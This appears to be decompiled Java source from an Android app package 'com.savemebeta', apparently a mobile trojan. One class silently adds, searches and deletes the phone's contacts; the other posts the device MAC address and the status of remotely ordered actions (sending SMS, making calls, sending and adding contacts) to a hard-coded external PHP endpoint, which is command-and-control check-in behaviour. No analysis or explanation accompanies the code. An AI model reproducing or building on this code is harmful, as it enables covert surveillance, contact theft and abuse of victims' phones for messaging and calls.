package com.savemebeta;

import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.ContactsContract.RawContacts;
import android.util.Log;
import java.util.ArrayList;

public class COOP {
    public static String TAG = "ContactOperations";

    public static void Insert2Contacts(Context ctx, String nameSurname, String telephone) {
        if (!isTheNumberExistsinContacts(ctx, telephone)) {
            ArrayList<ContentProviderOperation> ops = new ArrayList();
            int rawContactInsertIndex = ops.size();
            ops.add(ContentProviderOperation.newInsert(RawContacts.CONTENT_URI).withValue("account_type", null).withValue("account_name", null).build());
            ops.add(ContentProviderOperation.newInsert(Data.CONTENT_URI).withValueBackReference("raw_contact_id", rawContactInsertIndex).withValue("mimetype", "vnd.android.cursor.item/phone_v2").withValue("data1", telephone).build());
            ops.add(ContentProviderOperation.newInsert(Data.CONTENT_URI).withValueBackReference("raw_contact_id", rawContactInsertIndex).withValue("mimetype", "vnd.android.cursor.item/name").withValue("data1", nameSurname).build());
            try {
                ctx.getContentResolver().applyBatch("com.android.contacts", ops);
            } catch (Exception e) {
                Log.d(TAG, e.getMessage());
            }
        }
    }

    public static boolean isTheNumberExistsinContacts(Context ctx, String phoneNumber) {
        Cursor cur = null;
        ContentResolver cr = null;
        try {
            cr = ctx.getContentResolver();
        } catch (Exception ex) {
            Log.d(TAG, ex.getMessage());
        }
        try {
            cur = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        } catch (Exception ex2) {
            Log.i(TAG, ex2.getMessage());
        }
        try {
            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex("_id"));
                    String name = cur.getString(cur.getColumnIndex("display_name"));
                    if (Integer.parseInt(cur.getString(cur.getColumnIndex("has_phone_number"))) > 0) {
                        Cursor phones = ctx.getContentResolver().query(Phone.CONTENT_URI, null, "contact_id = " + id, null, null);
                        while (phones.moveToNext()) {
                            if (phones.getString(phones.getColumnIndex("data1")).replace(" ", "").replace("(", "").replace(")", "").contains(phoneNumber)) {
                                phones.close();
                                return true;
                            }
                        }
                        phones.close();
                    }
                }
            }
        } catch (Exception ex22) {
            Log.i(TAG, ex22.getMessage());
        }
        return false;
    }

    public static boolean deleteContact(Context ctx, String phoneNumber) {
        Cursor cur = ctx.getContentResolver().query(Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber)), null, null, null, null);
        try {
            if (cur.moveToFirst()) {
                do {
                    ctx.getContentResolver().delete(Uri.withAppendedPath(Contacts.CONTENT_LOOKUP_URI, cur.getString(cur.getColumnIndex("lookup"))), null, null);
                } while (cur.moveToNext());
            }
        } catch (Exception e) {
            System.out.println(e.getStackTrace());
        }
        return false;
    }
}
package com.savemebeta;

import android.os.AsyncTask;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class update {
    public static String Add_Contact;
    public static String Mac;
    public static String Make_Call;
    public static String SendTime;
    public static String Send_Contact;
    public static String Send_ESms;
    public static String Send_Sms;
    public static String Still_Here;
    public static String Timea;

    public class sendmystatus extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/updatestatus.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("mac", update.Mac));
            nameValuePairs.add(new BasicNameValuePair("sendsms", update.Send_Sms));
            nameValuePairs.add(new BasicNameValuePair("sendesms", update.Send_ESms));
            nameValuePairs.add(new BasicNameValuePair("makecall", update.Make_Call));
            nameValuePairs.add(new BasicNameValuePair("sendcontact", update.Send_Contact));
            nameValuePairs.add(new BasicNameValuePair("addcontact", update.Add_Contact));
            nameValuePairs.add(new BasicNameValuePair("timea", update.Timea));
            nameValuePairs.add(new BasicNameValuePair("checkif", "yes"));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            return null;
        }
    }

    public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck) {
        SendTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Calendar.getInstance().getTime());
        Mac = upmac;
        Send_Sms = upsms;
        Send_ESms = upesms;
        Make_Call = upcall;
        Send_Contact = upcontact;
        Add_Contact = upacontact;
        Timea = SendTime;
        Still_Here = upcheck;
        new sendmystatus().execute(new Void[0]);
    }
}
